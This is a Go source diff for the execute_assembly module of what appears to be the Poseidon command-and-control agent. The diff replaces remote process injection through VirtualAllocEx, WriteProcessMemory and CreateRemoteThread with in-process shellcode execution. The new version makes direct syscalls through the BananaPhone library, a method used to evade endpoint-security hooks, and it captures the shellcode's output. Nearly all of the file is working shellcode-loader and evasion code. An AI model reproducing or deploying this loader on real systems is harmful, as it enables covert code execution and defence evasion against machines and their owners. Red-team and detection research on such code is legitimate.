@@ -4,124 +4,136 @@
 package execute_assembly
 
 import (
-	"bytes"
+	// Standard
 	"errors"
 	"fmt"
-	"os/exec"
-	//"strings"
 	"syscall"
-	"time"
 	"unsafe"
+
+	// External
+	bananaphone "github.com/C-Sto/BananaPhone/pkg/BananaPhone"
+
+	// Poseidon
+	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/io"
 )
 
-const (
-	PROCESS_ALL_ACCESS = syscall.STANDARD_RIGHTS_REQUIRED | syscall.SYNCHRONIZE | 0xfff
-	MEM_COMMIT         = 0x001000
-	MEM_RESERVE        = 0x002000
-	STILL_RUNNING      = 259
-	CREATE_SUSPENDED   = 0x00000004
-)
+func executeShellcode(sc []byte) (string, error) {
 
-var (
-	kernel32           = syscall.MustLoadDLL("kernel32.dll")
-	virtualAllocEx     = kernel32.MustFindProc("VirtualAllocEx")
-	writeProcessMemory = kernel32.MustFindProc("WriteProcessMemory")
-	createRemoteThread = kernel32.MustFindProc("CreateRemoteThread")
-	getExitCodeThread  = kernel32.MustFindProc("GetExitCodeThread")
-)
-
-func executeShellcode(sc []byte, spawnas string) (string, error) {
-
-	// create process
-	var stdoutBuf bytes.Buffer
-	var stderrBuf bytes.Buffer
-	proc := exec.Command(spawnas)
-
-	proc.SysProcAttr = &syscall.SysProcAttr{
-		HideWindow:    true,
-		CreationFlags: CREATE_SUSPENDED,
-	}
-	proc.Stdout = &stdoutBuf
-	proc.Stderr = &stderrBuf
-	err := proc.Start()
+	err := io.RedirectStdoutStderr()
 	if err != nil {
-		return "", errors.New(spawnas + " process failed to start")
-	}
-
-	pid := proc.Process.Pid
-
-	// Open Process
-	handle, err := syscall.OpenProcess(PROCESS_ALL_ACCESS, true, uint32(pid))
-	if err != nil {
-		return "", errors.New("OpenProcess failed")
-	}
-
-	// VirtualAllocEx
-	addr, _, _ := virtualAllocEx.Call(
-		uintptr(handle),
-		0,
-		uintptr(len(sc)),
-		MEM_COMMIT|MEM_RESERVE,
-		syscall.PAGE_EXECUTE_READWRITE,
-	)
-
-	if int(addr) == 0 {
-		return "", errors.New("VirtualAllocEx failed")
-	}
-
-	// WriteProcessMemory
-	var nLength uint32
-	r1, _, _ := writeProcessMemory.Call(
-		uintptr(handle),
-		addr,
-		uintptr(unsafe.Pointer(&sc[0])),
-		uintptr(len(sc)),
-		uintptr(unsafe.Pointer(&nLength)),
-	)
-	if int(r1) == 0 {
-		return "", errors.New("WriteProcessMemory failed")
-	}
-
-	// CreateRemoteThread
-	threadHandle, _, err := createRemoteThread.Call(
-		uintptr(handle),
-		0,
-		0,
-		addr,
-		0,
-		0,
-		0,
-	)
-
-	if err != nil && err.Error() != "The operation completed successfully." {
 		return "", err
 	}
 
-	// Running
-	// fmt.Println("Got thread handle:", threadHandle)
-	var exitCode uint32
-	for {
-		r1, _, err := getExitCodeThread.Call(
-			uintptr(threadHandle),
-			uintptr(unsafe.Pointer(&exitCode)),
-		)
-		if r1 == 0 {
-			return "", err
-		}
+	err = run(sc)
+	if err != nil {
+		return "", err
+	}
 
-		if err != nil && err.Error() != "The operation completed successfully." {
-			return "", err
-		}
-		if exitCode == STILL_RUNNING {
-			time.Sleep(1000 * time.Millisecond)
-		} else {
-			break
-		}
+	stdout, stderr, err := io.ReadStdoutStderr()
+	if err != nil {
+		return "", err
+	}
+
+	err = io.RestoreStdoutStderr()
+	if err != nil {
+		return "", err
 	}
 
 	// Cleanup
-	outStr, errStr := stdoutBuf.String(), stderrBuf.String()
-	proc.Process.Kill()
-	out := fmt.Sprintf("\nout:\n%s\nerr:\n%s\n", outStr, errStr)
+	out := fmt.Sprintf("\nout:\n%s\nerr:\n%s\n", stdout, stderr)
 	return out, nil
+}
+
+func run(shellcode []byte) error {
+	bp, e := bananaphone.NewBananaPhone(bananaphone.AutoBananaPhoneMode)
+	if e != nil {
+		fmt.Println(e)
+		return errors.New("failed to load bananaphone")
+	}
+
+	//resolve the functions and extract the syscalls
+	alloc, e := bp.GetSysID("NtAllocateVirtualMemory")
+	if e != nil {
+		return errors.New("failed to resolve NtAllocateVirtualMemory SysID")
+	}
+
+	protect, e := bp.GetSysID("NtProtectVirtualMemory")
+	if e != nil {
+		return errors.New("failed to resolve NtProtectVirtualMemory SysID")
+	}
+	createthread, e := bp.GetSysID("NtCreateThreadEx")
+	if e != nil {
+		return errors.New("failed to resolve NtCreateThreadEx")
+	}
+
+	err := createThread(shellcode, uintptr(0xffffffffffffffff), alloc, protect, createthread)
+	if err != nil {
+		return err
+	}
+	return nil
+}
+
+func createThread(shellcode []byte, handle uintptr, NtAllocateVirtualMemorySysid, NtProtectVirtualMemorySysid, NtCreateThreadExSysid uint16) error {
+
+	const (
+		thisThread = uintptr(0xffffffffffffffff) //special macro that says 'use this thread/process' when provided as a handle.
+		memCommit  = uintptr(0x00001000)
+		memreserve = uintptr(0x00002000)
+	)
+
+	var baseA uintptr
+	regionsize := uintptr(len(shellcode))
+	r1, r := bananaphone.Syscall(
+		NtAllocateVirtualMemorySysid, //ntallocatevirtualmemory
+		handle,
+		uintptr(unsafe.Pointer(&baseA)),
+		0,
+		uintptr(unsafe.Pointer(&regionsize)),
+		uintptr(memCommit|memreserve),
+		syscall.PAGE_READWRITE,
+	)
+	if r != nil {
+		fmt.Printf("1 %s %x\n", r, r1)
+		return errors.New("NtAllocateVirtualMemory failed")
+	}
+
+	//write memory
+	bananaphone.WriteMemory(shellcode, baseA)
+
+	var oldprotect uintptr
+	r1, r = bananaphone.Syscall(
+		NtProtectVirtualMemorySysid, //NtProtectVirtualMemory
+		handle,
+		uintptr(unsafe.Pointer(&baseA)),
+		uintptr(unsafe.Pointer(&regionsize)),
+		syscall.PAGE_EXECUTE_READ,
+		uintptr(unsafe.Pointer(&oldprotect)),
+	)
+	if r != nil {
+		fmt.Printf("1 %s %x\n", r, r1)
+		return errors.New("NtProtectVirtualMemory failed")
+	}
+
+	var hhosthread uintptr
+	r1, r = bananaphone.Syscall(
+		NtCreateThreadExSysid,                //NtCreateThreadEx
+		uintptr(unsafe.Pointer(&hhosthread)), //hthread
+		0x1FFFFF,                             //desiredaccess
+		0,                                    //objattributes
+		handle,                               //processhandle
+		baseA,                                //lpstartaddress
+		0,                                    //lpparam
+		uintptr(0),                           //createsuspended
+		0,                                    //zerobits
+		0,                                    //sizeofstackcommit
+		0,                                    //sizeofstackreserve
+		0,                                    //lpbytesbuffer
+	)
+	syscall.WaitForSingleObject(syscall.Handle(hhosthread), 0xffffffff)
+	if r != nil {
+		fmt.Printf("1 %s %x\n", r, r1)
+		return errors.New("NtCreateThreadEx failed")
+	}
+
+	return nil
 }
